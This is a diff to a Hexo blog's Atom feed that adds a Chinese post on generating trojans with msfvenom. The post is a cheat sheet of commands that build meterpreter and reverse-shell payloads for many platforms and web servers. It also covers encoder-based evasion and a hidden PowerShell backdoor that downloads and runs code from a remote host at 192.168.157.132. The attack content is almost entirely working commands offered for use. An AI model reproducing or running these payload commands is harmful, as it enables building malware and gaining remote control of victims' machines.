@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-07T08:16:47.876Z</updated>
+  <updated>2019-12-07T11:44:48.685Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>msfvenom生成木马</title>
+    <link href="http://yoursite.com/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/"/>
+    <id>http://yoursite.com/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</id>
+    <published>2019-12-07T08:32:54.000Z</published>
+    <updated>2019-12-07T11:44:48.685Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>msfvenom生成shellcode：</p><p>简单生成：</p><p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.133 LPORT=11111 -f exe -o /root/1.exe</p><p><img src="https://img.vim-cn.com/c5/d9c67375dd4c1ec02137b88be039e3235d8593.png" alt="1"></p><p>-p 指定payload，payload后跟该payload的选项</p><p>-o 指定payload的保存路径，包含文件名</p><p>替换指定代码：</p><p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\x00’ -f exe -o /root/1.exe</p><p><img src="https://img.vim-cn.com/e5/44e7181d3af7fe217e5e67a47a30a15673eb05.png" alt="2"></p><p>-b 替换代码中会出现中断的字符，如 ‘\x00\xff’</p><p>指定编码器：</p><p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\x00’ -e x86/shikata_ga_nai -f exe -o /root/1.exe</p><p><img src="https://img.vim-cn.com/21/1b62b1f8e53ab179dbd4da1cc31ebdd4651b65.png" alt="3"></p><p>-e 指定特定的编码器</p><p>Windows：</p><p>​        msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe<br>​        msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\back.exe</p><p>Linux：<br>        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf</p><p>MAC：<br>        msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho &gt; shell.macho</p><p>PHP：<br>        msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php</p><p>Asp：<br>        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp &gt; shell.asp</p><p>Aspx：<br>        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx &gt; shell.aspx</p><p>JSP：<br>        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.jsp</p><p>War：<br>        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war &gt; shell.war</p><p>Bash：<br>        msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On>-f raw &gt; shell.sh</p><p>Perl：<br>        msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.pl</p><p>Python：<br>        msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py</p><p>exe 利用exec执行powershell后门:<br>        msfvenom -p windows/exec CMD=”powershell.exe -nop -w hidden -c $M=new-object net.webclient;$M.proxy=[Net.WebRequest]::GetSystemWebProxy();$M.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $M.downloadstring(‘<a href="http://192.168.157.132:8080/4WFjDXrGo7Mj&#39;);&quot;" target="_blank" rel="noopener">http://192.168.157.132:8080/4WFjDXrGo7Mj&#39;);&quot;</a> -f exe -e x86/shikata_ga_nai -i 6 -o msf.exe</p><p>列出所有可用的攻击载荷：</p><p><img src="https://img.vim-cn.com/c2/49f2ba4a8a0f6e4acfc59020d5afc09a4487be.png" alt="11"></p><p>列出Windows平台下最为常见的payload个数：</p><p><img src="https://img.vim-cn.com/0e/2fb66bcd14658adcccac4655538c0855ccc2e8.png" alt="12"></p><p>查看excellent级的编码方式：</p><p><img src="https://img.vim-cn.com/44/ae0116860d8ecfc3da9437fd12277446ef9bc9.png" alt="13"></p><p>查看nops（空字段）选项：</p><p><img src="https://img.vim-cn.com/18/2597fd7c59b384d8434645424863747519faae.png" alt="14"></p><p>查看可以生产的格式：</p><p><img src="https://img.vim-cn.com/eb/bd7b4f8c70a6e7ec356bc4b9314046884282bf.png" alt="15"></p><p>查看当前支持的平台：</p><p><img src="https://img.vim-cn.com/13/ac42cb17ab0e5944e070b68a6469ea1e6223d1.png" alt="16"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;p&gt;msfvenom生成shellcode：&lt;/p&gt;
+&lt;p&gt;简单生成：&lt;/p&gt;
+&lt;p&gt;​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.133 LPORT=11111 -f e
+      
+    
+    </summary>
+    
+    
+    
+      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
   
   <entry>
     <title>weevely</title>
